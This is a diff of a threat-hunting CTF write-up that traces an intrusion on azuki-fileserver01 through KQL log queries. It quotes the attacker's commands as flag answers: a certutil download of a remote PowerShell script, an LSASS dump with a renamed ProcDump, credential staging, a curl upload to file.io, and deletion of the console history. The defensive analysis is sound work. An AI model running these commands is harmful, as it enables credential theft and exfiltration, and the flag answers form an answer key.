@@ -99,7 +99,8 @@ DeviceLogonEvents
 ```
 I found evidence that there was an RDP connection from the IP of 159.26.106.98 which corelates to the timing of the malicious activity. The RDP connection was to the same AccountName, Kenji Sato, as the initial access in Port of entry incident.
 
-<img width="1442" height="538" alt="image" src="https://github.com/user-attachments/assets/77165d67-e182-4210-afb3-41e4e5f201a9" />
+<img width="1231" height="506" alt="image" src="https://github.com/user-attachments/assets/abe21e4f-ad31-49ae-9ce6-d03151f56e0e" />
+
 
 
 
@@ -107,15 +108,17 @@ I found evidence that there was an RDP connection from the IP of 159.26.106.98 w
 
 ## 🚩 Flag 2: LATERAL MOVEMENT - Compromised Device
 
-Answer: azuki-fileserver01
+Objective: azuki-fileserver01
 
 The attacker, connected to the azuki-fileserver01 from the same IP he used to connect to Kenji Sato account, which can be visible from Flag 1. 
+
+<img width="1239" height="470" alt="image" src="https://github.com/user-attachments/assets/d3614fae-62bd-4c4c-8ee3-3c742e37e5bc" />
 
 ---
 
 ## 🚩 Flag 3: LATERAL MOVEMENT - Compromised Account
 
-Answer: fileadmin
+Objective: fileadmin
 
 The Account name is also visible in the evidence from Flag 1.
 
@@ -123,7 +126,7 @@ The Account name is also visible in the evidence from Flag 1.
 
 ## 🚩Flag 4: DISCOVERY - Share Enumeration Command
 
-Answer: "net.exe" share
+Object: "net.exe" share
 
 Query used:
 ```
@@ -134,9 +137,13 @@ DeviceProcessEvents
 | project Timestamp, ProcessCommandLine,InitiatingProcessCommandLine, AccountName, FolderPath
 ```
 
-<img width="900" height="1326" alt="image" src="https://github.com/user-attachments/assets/94532b94-8e0b-4074-9303-3a917d7884c1" />
+<img width="1243" height="311" alt="image" src="https://github.com/user-attachments/assets/d179be2c-47e6-405f-aebb-a49552b17479" />
 
-With the command above, I could see the attacker's chain of commands, which answered most of the questions, specifically flag 4, 5, 6, 7, 8, 9, 10, 12 and 13.
+
+I was able to extract evidences  from 🚩4 Query for 🚩 5, 6, 7, 8,9,10,12 and 13
+
+<img width="1041" height="595" alt="image" src="https://github.com/user-attachments/assets/e2eaafb1-d5e1-4f38-9341-fc4342482e02" />
+
 
 - First he enumerated the network shares,
 - then he enumerated remote network shares,
@@ -153,43 +160,43 @@ These are all the actions we can see from the above evidence. The rest is covere
 
 ## 🚩 Flag 5: DISCOVERY - Remote Share Enumeration
 
-Answer: "net.exe" view \\10.1.0.188
+Object: "net.exe" view \\10.1.0.188
 
 ---
 
 ## 🚩 Flag 6: DISCOVERY - Privilege Enumeration
 
-Answer: "whoami.exe" /all
+Object: "whoami.exe" /all
 
 ---
 
 ## 🚩 Flag 7: DISCOVERY - Network Configuration Command
 
-Answer: "ipconfig.exe" /all
+Object: "ipconfig.exe" /all
 
 ---
 
 ## 🚩 Flag 8: DEFENSE EVASION - Directory Hiding Command
 
-Answer: "attrib.exe" +h +s C:\Windows\Logs\CBS
+Object: "attrib.exe" +h +s C:\Windows\Logs\CBS
 
 ---
 
 ## 🚩 Flag 9: COLLECTION - Staging Directory Path
 
-Answer: C:\Windows\Logs\CBS
+Object: C:\Windows\Logs\CBS
 
 ---
 
 ## 🚩 Flag 10 DEFENSE EVASION - Script Download Command
 
-Answer: "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
+Object: "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
 
 ---
 
 ## 🚩 Flag 11: COLLECTION - Credential File Discovery
 
-Answer: IT-Admin-Passwords.csv
+Object: IT-Admin-Passwords.csv
 
 Query used:
 ```
@@ -200,7 +207,8 @@ DeviceFileEvents
 | order by Timestamp asc 
 ```
 
-<img width="800" height="152" alt="image" src="https://github.com/user-attachments/assets/dee72987-eccd-4398-966e-553b1816560a" />
+<img width="1227" height="400" alt="image" src="https://github.com/user-attachments/assets/bff8edeb-4b6c-47fe-bfd0-f73830f24cd6" />
+
 
 I looked in the staging directory for all created files, and found the correct file, by knowing all the commands executed, which show the phrase "it-admin", as can be seen from flags 12 and 13.
 
@@ -208,19 +216,19 @@ I looked in the staging directory for all created files, and found the correct f
 
 ## 🚩 Flag 12: COLLECTION - Recursive Copy Command
 
-Answer: "xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y
+Object: "xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y
 
 ---
 
 ## 🚩 Flag 13: COLLECTION - Compression Command
 
-Answer: "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .
+Object: "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .
 
 ---
 
 ## 🚩 Flag 14: CREDENTIAL ACCESS - Renamed Tool
 
-Answer: pd.exe
+Object: pd.exe
 
 Query used:
 ```
@@ -231,7 +239,8 @@ DeviceFileEvents
 | order by Timestamp asc 
 ```
 
-<img width="800" height="196" alt="image" src="https://github.com/user-attachments/assets/b3499318-ccbb-4760-a730-bd9813f5d502" />
+<img width="1231" height="233" alt="image" src="https://github.com/user-attachments/assets/06108fd6-eb5b-4578-a93d-9f533f03c713" />
+
 
 The answer can be seen from Flag15 as well. Still, there is also evidence of FileCreation and Deletion within the DeviceFileEvents of the file in question, pd.exe, which was renamed from ProcDump.exe, the Sysinternals utility.
 
@@ -239,7 +248,7 @@ The answer can be seen from Flag15 as well. Still, there is also evidence of Fil
 
 ## 🚩 Flag 15: CREDENTIAL ACCESS - Memory Dump Command
 
-Answer: "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
+Object: "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
 
 Query used:
 ```
@@ -249,7 +258,7 @@ DeviceProcessEvents
 | where ProcessCommandLine has_any ("powershell", "cmd") or InitiatingProcessCommandLine has_any ("powershell", "cmd")
 | project Timestamp, ProcessCommandLine,InitiatingProcessCommandLine, AccountName, FolderPath
 ```
-<img width="800" height="210" alt="image" src="https://github.com/user-attachments/assets/94aa33aa-a1bb-4123-b7c1-15b86a07ad4b" />
+<img width="1245" height="251" alt="image" src="https://github.com/user-attachments/assets/ced5af30-bfa8-4537-ac43-3ccfff6586a3" />
 
 Flag 15 is also part of the commands executed by the attacker and as can be seen from the evidence provided, the attacker executed the above mentioned command to dump all memory of the PID 876 which is lsass.exe in this case and output it in the C:\Windows\Logs\CBS\ folder as lsass.dmp file.
 
@@ -257,7 +266,7 @@ Flag 15 is also part of the commands executed by the attacker and as can be seen
 
 ## 🚩 Flag 16: EXFILTRATION - Upload Command
 
-Answer: "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
+Object: "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
 
 Query used:
 ```
@@ -267,7 +276,7 @@ DeviceProcessEvents
 | where ProcessCommandLine has_any ("powershell", "cmd") or InitiatingProcessCommandLine has_any ("powershell", "cmd")
 | project Timestamp, ProcessCommandLine,InitiatingProcessCommandLine, AccountName, FolderPath
 ```
-<img width="900" height="614" alt="image" src="https://github.com/user-attachments/assets/6dce7abb-de5a-4d14-8bfc-bdc99e5e0f0d" />
+<img width="1259" height="421" alt="image" src="https://github.com/user-attachments/assets/38b56dcb-ea5c-4fdb-a042-70af54ecbd06" />
 
 The evidence provided is the continuation from Flag 4, where we can see more of the attacker's commands, which answer the questions for Flags 16, 17, 18 and 19.
 
@@ -278,25 +287,25 @@ The evidence provided is the continuation from Flag 4, where we can see more of 
 
 ## 🚩 Flag 17: EXFILTRATION - Cloud Service
 
-Answer: file.io
+Object: file.io
 
 ---
 
 ## 🚩 Flag 18: PERSISTENCE - Registry Value Name
 
-Answer: FileShareSync
+Object: FileShareSync
 
 ---
 
 ## 🚩 Flag 19: PERSISTENCE - Beacon Filename
 
-Answer: svchost.ps1
+Object: svchost.ps1
 
 ---
 
 ## 🚩 Flag 20: ANTI-FORENSICS - History File Deletion
 
-Answer: ConsoleHost_history.txt
+Object: ConsoleHost_history.txt
 
 Query used:
 ```
@@ -308,6 +317,6 @@ DeviceFileEvents
 | order by Timestamp asc 
 ```
 
-<img width="800" height="160" alt="image" src="https://github.com/user-attachments/assets/4dfde380-0fdc-4c0a-8189-8525f7f7af8e" />
+<img width="1223" height="181" alt="image" src="https://github.com/user-attachments/assets/711ee332-2e61-450e-a557-7a6b2f1b03b5" />
 
 This was the only file deleted in the Users/fileadmin directory. With this, the attacker wanted to hide his footprints, because the file contains the entire console/powershell history for the User folder that contains the file.
